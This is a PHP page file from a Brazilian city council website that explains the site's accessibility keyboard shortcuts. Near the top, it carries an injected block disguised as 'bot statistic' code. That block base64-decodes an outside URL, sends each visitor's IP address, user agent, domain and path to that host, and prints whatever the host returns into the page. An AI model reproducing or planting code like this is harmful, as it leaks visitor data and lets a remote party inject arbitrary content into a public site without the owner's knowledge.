<?php

include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Acessibilidade");
$oMasterPage->AddParameter("css", "acessibilidade/index");
$oMasterPage->AddParameter("pagina", "acessibilidade");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>
    <h1>Acessibilidade</h1>
    <p>Na parte superior do Portal da Câmara Municipal de São José dos Campos existe uma barra de acessibilidade onde se encontra atalhos de navegação
        padronizados e a opção para alterar o contraste. Essas ferramentas estão disponíveis em todas as páginas do
        portal.</p>
    <p>Os padrões de atalhos do site da Câmara Municipal de São José dos Campos são:</p>

    <p> Teclando-se <strong>Alt + 1</strong> em qualquer página do portal, chega-se diretamente ao começo do conteúdo principal da
        página.</p>

    <p> Teclando-se <strong>Alt + 2</strong>  em qualquer página do portal, chega-se diretamente ao início do menu principal.</p>

    <p>Teclando-se<strong> Alt + 3</strong>  em qualquer página do portal, chega-se diretamente ao rodapé da página.</p>

    <p>No caso do <strong>Firefox</strong> , em vez de Alt + número, tecle simultaneamente Alt + Shift + número.</p>

    <p> Sendo Firefox no Mac OS, em vez de Alt + Shift + número, tecle simultaneamente Ctrl + Alt + número.</p>

    <p> No Opera , as teclas são Shift + Escape + número. Ao teclar apenas Shift + Escape, o usuário encontrará uma
        janela com todas as alternativas de ACCESSKEY da página.</p>



        <div class="clear"></div>

<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>